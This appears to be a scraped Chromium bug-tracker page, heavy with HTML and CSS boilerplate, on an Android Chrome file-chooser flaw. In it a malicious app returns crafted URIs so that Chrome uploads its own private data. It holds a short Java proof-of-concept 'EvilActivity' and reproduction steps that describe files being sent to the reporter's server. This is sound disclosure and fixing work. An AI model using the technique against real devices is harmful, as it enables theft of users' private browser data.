      <div class="issue-diff">
        <!---->
          <strong><!---->Status:</strong>
          
          Assigned
          (was: Unconfirmed)
          <br>
        <!---->
          <strong><!---->Owner:</strong>
          
          finnur@chromium.org
          
          <br>
        <!---->
          <strong><!---->Cc:</strong>
          
          peter@chromium.org
          
          <br>
        <!---->
          <strong><!---->Labels:</strong>
          
          Security_Severity-Medium Security_Impact-Stable Pri-1
          
          <br>
        <!---->
          <strong><!---->Components:</strong>
          
          Blink&gt;Forms&gt;File
          
          <br>
        <!---->
        
      </div><br>
    
        
      
        Capturing some email discussion:<span class="line"><!---->Capturing some email discussion:<!----></span><br><br>I agree there is a Chrome bug here. I wasn't sure if there was a framework issue too, though, because ACTION_GET_CONTENT's documentation [1] says, "Output: The URI of the item that was picked. This **must** be a content: URI so that any receiver can access it" (emphasis mine).<span class="line"><!---->I agree there is a Chrome bug here. I wasn't sure if there was a framework issue too, though, because ACTION_GET_CONTENT's documentation [1] says, "Output: The URI of the item that was picked. This **must** be a content: URI so that any receiver can access it" (emphasis mine).<!----></span><br><br>But, Will pointed pointed out that "Even if the framework were to try and enforce that I think that is orthogonal from potential security issues; there are still scenarios where a malicious app could return a URI that results in a possible security bug if not handled properly by the receiving app. For example, a malicious app could return a content URI that points to a non-exported content provider in the receiving app."<span class="line"><!---->But, Will pointed pointed out that "Even if the framework were to try and enforce that I think that is orthogonal from potential security issues; there are still scenarios where a malicious app could return a URI that results in a possible security bug if not handled properly by the receiving app. For example, a malicious app could return a content URI that points to a non-exported content provider in the receiving app."<!----></span><br><br>It looks like the SelectFileDialog.java already tries to protect against uploading private data files in some cases [2], but that same check is not applied [3] when converting a CONTENT_SCHEME’s data to FILE_SCHEME. I think we’d also want to add a similar check when processing the result of the ACTION_IMAGE_CAPTURE [4].<span class="line"><!---->It looks like the SelectFileDialog.java already tries to protect against uploading private data files in some cases [2], but that same check is not applied [3] when converting a CONTENT_SCHEME’s data to FILE_SCHEME. I think we’d also want to add a similar check when processing the result of the ACTION_IMAGE_CAPTURE [4].<!----></span><br><br>And so also probably want to take Will’s point and verify that any CONTENT_SCHEME data aren’t coming from a non-exported component of Chrome.<span class="line"><!---->And so also probably want to take Will’s point and verify that any CONTENT_SCHEME data aren’t coming from a non-exported component of Chrome.<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://developer.android.com/reference/android/content/Intent#ACTION_GET_CONTENT<a class="undefined" target="_blank" href="https://developer.android.com/reference/android/content/Intent#ACTION_GET_CONTENT"><!---->https://developer.android.com/reference/android/content/Intent#ACTION_GET_CONTENT<!----></a><br>[2] <span class="line"><!---->[2] <!----></span>https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=866;drc=5d60ceec700919b12597ce94c8496e087162c5c7<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=866;drc=5d60ceec700919b12597ce94c8496e087162c5c7"><!---->https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=866;drc=5d60ceec700919b12597ce94c8496e087162c5c7<!----></a><br>[3] <span class="line"><!---->[3] <!----></span>https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=908;drc=5d60ceec700919b12597ce94c8496e087162c5c7<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=908;drc=5d60ceec700919b12597ce94c8496e087162c5c7"><!---->https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=908;drc=5d60ceec700919b12597ce94c8496e087162c5c7<!----></a><br>[4] <span class="line"><!---->[4] <!----></span>https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=638;drc=5d60ceec700919b12597ce94c8496e087162c5c7<a         Hi, maybe this is a webview framework issue too, developers who using webview always forget to limit the localpath of uploading files in their applications, so I think we could limit the localpath of upload feature to /sdcard or exclude this directory /data/data/ in webview to help developers mitigate this case.<span class="line"><!---->Hi, maybe this is a webview framework issue too, developers who using webview always forget to limit the localpath of uploading files in their applications, so I think we could limit the localpath of upload feature to /sdcard or exclude this directory /data/data/ in webview to help developers mitigate this case.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>

        ```<span class="line"><!---->```<!----></span><br>public class EvilActivity extends AppCompatActivity {<span class="line"><!---->public class EvilActivity extends AppCompatActivity {<!----></span><br>    final static String PRIVATE_URI = "content://media/external/downloads/196";<span class="line"><!---->    final static String PRIVATE_URI = "content://media/external/downloads/196";<!----></span><br><br>    @Override<span class="line"><!---->    @Override<!----></span><br>    protected void onCreate(@Nullable Bundle savedInstanceState) {<span class="line"><!---->    protected void onCreate(@Nullable Bundle savedInstanceState) {<!----></span><br>        super.onCreate(savedInstanceState);<span class="line"><!---->        super.onCreate(savedInstanceState);<!----></span><br>        setContentView(R.layout.activity_main);<span class="line"><!---->        setContentView(R.layout.activity_main);<!----></span><br><br>        Log.d("wester", "EvilActivity started!");<span class="line"><!---->        Log.d("wester", "EvilActivity started!");<!----></span><br>        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));<span class="line"><!---->        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));<!----></span><br>        finish();<span class="line"><!---->        finish();<!----></span><br><br>    }<span class="line"><!---->    }<!----></span><br>}<span class="line"><!---->}<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>content://media/external/downloads/[num] can work, I success read and upload the file I downloaded before.<span class="line"><!---->content://media/external/downloads/[num] can work, I success read and upload the file I downloaded before.<!----></span><mr-comment-content></mr-comment-content>

        yeah, I know uploading files from the Downloads folder is a legitimate use-case.<span class="line"><!---->yeah, I know uploading files from the Downloads folder is a legitimate use-case.<!----></span><br><br>if user choose /sdcard/Downloads himself, it's indeed no problem, but when user click the third-party file manager app, he/she doesn't know it points to content://media/external/downloads/[num], this will allow the data downloaded by the user to be leaked.<span class="line"><!---->if user choose /sdcard/Downloads himself, it's indeed no problem, but when user click the third-party file manager app, he/she doesn't know it points to content://media/external/downloads/[num], this will allow the data downloaded by the user to be leaked.<!----></span><br><br>so I think we shouldn't allow the protocol "content://" in here.<span class="line"><!---->so I think we shouldn't allow the protocol "content://" in here.<!----></span><mr-comment-content></mr-comment-content>

          Comment 37<a class="comment-link" href="?id=1189092#c37">Comment 37<!----></a>

          
        by
        
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>
      qin...@chromium.org<a id="user-link" href="/u/951229368" title="qin...@chromium.org"><!---->qin...@chromium.org<!----></a>
      qin...@chromium.org<span id="user-text" hidden=""><!---->qin...@chromium.org<!----></span>
      <div id="availability-text" class="availability-notice" title="undefined" hidden=""><!----><!----></div>
    <mr-user-link></mr-user-link>
        on
        
      Mon, Apr 19, 2021, 1:08 PM EDT
    <chops-timestamp title="Mon, Apr 19, 2021, 1:08 PM EDT"></chops-timestamp>
        
      
        <div>
          <a class="comment-link" href="?id=1189092#c37">Comment 37<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Mon, Apr 19, 2021, 1:08 PM EDT"></chops-timestamp>
        
      
        </div>
        
      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1189092#c37">Comment 37<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Mon, Apr 19, 2021, 1:08 PM EDT"></chops-timestamp>
        
      
        </div>
        
      </div>
    
      
        
        
      
        Why content://media/external/downloads/xxx cannot be leaked?  The content://media/external/downloads/xxx  is  in the public MediaStore, and Chrome grants other apps to read those content URIs when it downloads the file.  Android has better permission controls on content URIs than file URIs. <span class="line"><!---->Why content://media/external/downloads/xxx cannot be leaked?  The content://media/external/downloads/xxx  is  in the public MediaStore, and Chrome grants other apps to read those content URIs when it downloads the file.  Android has better permission controls on content URIs than file URIs. <!----></span><br><br>So if a user is using a third-party file manager app, the third-party file manager app can actually read the files in content://media/external/downloads/ by itself and upload them. And it doesn't need to involve select file dialog in Chrome. It is the same for file:/// if user is using an external sd card for download locations.<span class="line"><!---->So if a user is using a third-party file manager app, the third-party file manager app can actually read the files in content://media/external/downloads/ by itself and upload them. And it doesn't need to involve select file dialog in Chrome. It is the same for file:/// if user is using an external sd card for download locations.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>
    
      
    <mr-comment headinglevel="2"></mr-comment>

        by

      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>
      finnur@chromium.org<a id="user-link" href="/u/1734713731" title="finnur@chromium.org"><!---->finnur@chromium.org<!----></a>
      finnur@chromium.org<span id="user-text" hidden=""><!---->finnur@chromium.org<!----></span>
      <div id="availability-text" class="availability-notice" title="undefined" hidden=""><!----><!----></div>
    <mr-user-link></mr-user-link>
        on
        
      Tue, Apr 20, 2021, 6:25 AM EDT

          <a class="comment-link" href="?id=1189092#c40">Comment 40<!----></a>

          
        by

      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1189092#c40">Comment 40<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Tue, Apr 20, 2021, 12:43 PM EDT"></chops-timestamp>
        
      
        </div>
        
      </div>
    
      
        
        
      
        regarding #38, Chrome has fileProviders that can generate content URI and grant access to files.  Offline page, for example, use this to generate content URIs for offline pages. Download also uses it to generate content URIs for files on EXTERNAL sdcard. But all the use cases are limited to a small set of files. So If any one misbehaves, it is up to the corresponding team to determine whether the URI access is valid.<span class="line"><!---->regarding #38, Chrome has fileProviders that can generate content URI and grant access to files.  Offline page, for example, use this to generate content URIs for offline pages. Download also uses it to generate content URIs for files on EXTERNAL sdcard. But all the use cases are limited to a small set of files. So If any one misbehaves, it is up to the corresponding team to determine whether the URI access is valid.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        This bug requires manual review: M91's targeted beta branch promotion date has already passed, so this requires manual review<span class="line"><!---->This bug requires manual review: M91's targeted beta branch promotion date has already passed, so this requires manual review<!----></span><br>Before a merge request will be considered, the following information is required to be added to this bug:<span class="line"><!---->Before a merge request will be considered, the following information is required to be added to this bug:<!----></span><br><br>1. Does your merge fit within the Merge Decision Guidelines?<span class="line"><!---->1. Does your merge fit within the Merge Decision Guidelines?<!----></span><br>- Chrome: <span class="line"><!---->- Chrome: <!----></span>https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge"><!---->https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge<!----></a><br>- Chrome OS: <span class="line"><!---->- Chrome OS: <!----></span>https://goto.google.com/cros-release-branch-merge-guidelines<a class="undefined" target="_blank" href="https://goto.google.com/cros-release-branch-merge-guidelines"><!---->https://goto.google.com/cros-release-branch-merge-guidelines<!----></a><br>2. Links to the CLs you are requesting to merge.<span class="line"><!---->2. Links to the CLs you are requesting to merge.<!----></span><br>3. Has the change landed and been verified on ToT?<span class="line"><!---->3. Has the change landed and been verified on ToT?<!----></span><br>4. Does this change need to be merged into other active release branches (M-1, M+1)?<span class="line"><!---->4. Does this change need to be merged into other active release branches (M-1, M+1)?<!----></span><br>5. Why are these changes required in this milestone after branch?<span class="line"><!---->5. Why are these changes required in this milestone after branch?<!----></span><br>6. Is this a new feature?<span class="line"><!---->6. Is this a new feature?<!----></span><br>7. If it is a new feature, is it behind a flag using finch?<span class="line"><!---->7. If it is a new feature, is it behind a flag using finch?<!----></span><br><br>Chrome OS Only:<span class="line"><!---->Chrome OS Only:<!----></span><br>8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: <span class="line"><!---->8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: <!----></span>http://go/cros-engprodcomponents<a class="undefined" target="_blank" href="http://go/cros-engprodcomponents"><!---->http://go/cros-engprodcomponents<!----></a><br><br>Please contact the milestone owner if you have questions.<span class="line"><!---->Please contact the milestone owner if you have questions.<!----></span><br>Owners: benmason@(Android), bindusuvarna@(iOS), kbleicher@(ChromeOS), pbommana@(Desktop)<span class="line"><!---->Owners: benmason@(Android), bindusuvarna@(iOS), kbleicher@(ChromeOS), pbommana@(Desktop)<!----></span><br><br>For more details visit <span class="line"><!---->For more details visit <!----></span>https://www.chromium.org/issue-tracking/autotriage<a class="undefined" target="_blank" href="https://www.chromium.org/issue-tracking/autotriage"><!---->https://www.chromium.org/issue-tracking/autotriage<!----></a> - Your friendly Sheriffbot<span class="line"><!----> - Your friendly Sheriffbot<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

      <div class="issue-diff">
        
        Description was changed.
      </div><br>

class="line"><!---->3.visit f.html via chrome, click choose file button and choose file mananger, choose the poc app "setresultcontactphotocrop"<!----></span><br><br>4. you will find out that the data in Android chrome private directory "/data/data/com.chrome/canary" is upload to my server(I use /app_tabs/0/tab697 for proof, there are many config files in Android chrome private directory)<span class="line"><!---->4. you will find out that the data in Android chrome private directory "/data/data/com.chrome/canary" is upload to my server(I use /app_tabs/0/tab697 for proof, there are many config files in Android chrome private directory)<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>user cannot read the data            issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      
        
          
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        
          
            
          <tbody>
            
          </tbody>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>

          Blocked on issues<span>Blocked on issues</span>
          
            close<i class="material-icons">close</i>
          <button aria-label="close">
            <i class="material-icons">close</i>
          </button>
        <h3 class="medium-heading">
          <span>Blocked on issues</span>
          <button aria-label="close">
            <i class="material-icons">close</i>
          </button>

          padding: 0;

          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      <mr-click-throughs></mr-click-throughs>

    <!----></mr-issue-details>
              <mr-launch-overview class="main-item" hidden=""><!---->
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      <style>
        mr-launch-overview {

        }
        mr-launch-overview[hidden] {
          display: none;
        }
        mr-phase {
          margin-bottom: 0.75em;
        }
      </style>

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);

        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }

          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;

                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                focus on the issue search field<span class="key-tip"><!---->focus on the issue search field<!----></span>
              
                
                  
                    c<kbd><!---->c<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->c<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                compose a new issue<span class="key-tip"><!---->compose a new issue<!----></span>
              
                
                  
                    s<kbd><!---->s<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->s<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                star the current issue<span class="key-tip"><!---->star the current issue<!----></span>
              
                
                  
                    ?<kbd><!---->?<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->?<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                show this help dialog<span class="key-tip"><!---->show this help dialog<!----></span>

                  <!---->:
                </span>

              <!---->
            </div>
          <!---->
            <div class="keyboard-help-section">
              <span></span><span class="help-title"><!---->Issue details<!----></span>

                  <!---->:

              <!---->
            </div>

              <span></span><span class="help-title"><!---->Anywhere<!----></span>

          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
